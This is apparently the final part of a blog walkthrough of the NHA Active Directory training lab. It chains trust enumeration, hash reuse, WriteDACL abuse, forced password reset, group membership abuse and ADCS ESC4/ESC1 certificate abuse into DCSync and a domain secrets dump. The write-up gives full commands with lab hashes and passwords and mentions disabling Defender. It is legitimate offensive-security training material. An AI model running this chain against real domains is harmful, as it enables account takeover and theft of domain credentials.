## Introduction
At this point, we have the domain. But we need to find any trust relationships that this domain has and if any, we need to move to that domain.

## Enumerating Trusts
We can check the trust relationships of the domain by using `ldeep`.

```bash
ldeep ldap -u Administrator -H 8fd12ffe951b45af5bea2bd921accba4:8fd12ffe951b45af5bea2bd921accba4 -d 192.168.58.20 -s ldap://192.18.58.20 trusts
```

We have a Bi-Directional, FOREST_TRANSITIVE trust relationship with the domain `ninja.hack`. To learn more about trust and relations [this](https://www.thehacker.recipes/a-d/movement/trusts) and [this](https://mayfly277.github.io/posts/GOADv2-pwning-part12/) are the two personally recommended posts.
So because this is a bi-directional trust, we are able to enumerate the objects in the other domain. We can get a havoc demon on the DC of academy domain and use `SharpHound.exe`.

```bash
dotnet inline-execute /opt/SharpCollection/NetFramework_4.7_Any/SharpHound.exe -c all -d ninja.hack --ldapusername backup --ldappassword 'Password123!'
```

If for some reason this is not working, you can use the same command in the WinRM session after turning Defender off. One other way to do it is to turn RDP on over the DC and then use command prompt to run `SharpHound.exe`. We can then enumerate the `ninja.hack` domain using the bidirectional trust that we saw earlier.
After looking a little, I can see that user `olivia` and a user `frank` exist in both the domains.

## ACLs to Rachel.Philips

We already have dumped hashes. We can try those hashes against these users to see if they work (Some of you might have made good notes unlike me to see that this also hints in the contact page of the original web page.).

![Same Users in Ninja Domain](/assets/img/NHA/olivia_davis_hash.png)


So we have a user in the ninja domain. perfect. If we look in bloodhound to her first degree object control, we can see that this user has `WriteDACL` permission over the user `rachel.philips`. We can use `this` to get to that user.

```bash
dacledit.py -action 'read' -principal olivia.davis -target 'rachel.philips' 'ninja.hack'/'olivia.davis' -hashes aad3b435b51404eeaad3b435b51404ee:91d85135bb2c4e12c46efbb77612c487

dacledit.py -action 'write' -rights 'FullControl' -target 'rachel.philips' 'ninja.hack'/'olivia.davis' -hashes aad3b435b51404eeaad3b435b51404ee:91d85135bb2c4e12c46efbb77612c487
```


![FullControl to Olivia](/assets/img/NHA/dacl_edit_olivia.png)


We were able to successfully change the access to `FullControl` to the user `rachel.philips`. Now we can change this user's password to access it. We cant use shadow credentials to get the hash for this user as done [here](https://mayfly277.github.io/posts/GOADv2-pwning-part11/#writedacl-on-user-joffrey---tyron) because we get `KDC_ERR_PADATA_TYPE_NOSUPP` error meaning ther DC is not set for PKINIT authentication. We can use `bloodyAD` for it as seen [here](https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword).


```bash
bloodyAD --host 192.168.58.10 -d ninja.hack -u olivia.davis -p :91d85135bb2c4e12c46efbb77612c487 set password rachel.philips 'Password123!'
```

## Path to JONIN Group

Looking back to BloodHound, I can see Group Delegated Object Control that I can use this user to the `jonin` group.


![Path to Jonin](/assets/img/NHA/path_to_jonin.png)



```bash
bloodyAD --host 192.168.58.10 -d ninja.hack -u rachel.philips -p 'Password123!' add groupMember jonin rachel.philips
```

We can confirm this using this.

```bash
ldeep ldap -u rachel.philips -p 'Password123!' -d ninja.hack -s ldap://192.168.58.10 membersof 'JONIN'
```

## Certificate Abuse

After poking around a lot and not finding anything, I started looking into the ADCS misconfigurations.


![ADCS](/assets/img/NHA/adcs_netexec.png)


We can use this to query and find the vulnerable template details.



```bash
certipy find -u 'rachel.philips@ninja.hack' -p 'Password123!' -dc-ip 192.168.58.10 -vulnerable -stdout
```


We can see that it specifies that `JONIN` has dangerous rights and its vulnerable to ECS4.



![ECS4](/assets/img/NHA/ecs4.png)


As said by [lummelsec](https://www.twitter.com/theluemmel) on [this](https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc4) post, we can use this command to make this certificate vulnerable to ECS1.

```bash
certipy template -u 'rachel.philips@ninja.hack' -p 'Password123!' -target 'ninja.hack' -template 'SignatureValidation'
```




![Updating](/assets/img/NHA/update_ecs4.png)
![ECS1](/assets/img/NHA/ecs1.png)




We can use this to get a certificate file.

```bash
certipy req -u 'rachel.philips@ninja.hack' -p 'Password123!' -target 'dc-vil.ninja.hack' -ca 'NINJA-CA' -template 'SignatureValidation' -upn 'Administrator@ninja.hack'
```


Next we can use these command to grant DCSync privileges to `rachel.philips` and dump secrets of the `ninja.hack` domain.

```bash
certipy cert -pfx "administrator.pfx" -nokey -out "user.crt"
certipy cert -pfx "administrator.pfx" -nocert -out "user.key"

passthecert.py -action modify_user -crt "user.crt" -key "user.key" -domain "ninja.hack" -dc-ip 192.168.58.10 -target "rachel.philips" -elevate

secretsdump.py -just-dc ninja.hack/rachel.philips:'Password123!'@ninja.hack
```


![NINJA Secrets](/assets/img/NHA/ninja_secrets.png)


And we can get the last flag as well (yes theres flags in this. i forgot to mention that in the previous posts. maybe the reader can try getting them all ;). )


![NINJA Last Flag](/assets/img/NHA/last_flag.png)


Aaaand thats it!! We have successfully gone through the whole NHA labs. Special thanks to the amazing creator [MayFly](https://twitter.com/M4yFly) who created them. As of writing this, he also introduced some new SCCM labs which I may or maynot be looking into next. This lab and SCCM and GOAD can be found [here](https://github.com/Orange-Cyberdefense/GOAD). Do give it a try to make AD methodology better. There will be a last post about blue team side of things. As always let me know if help is needed at any point. You know where to find me.
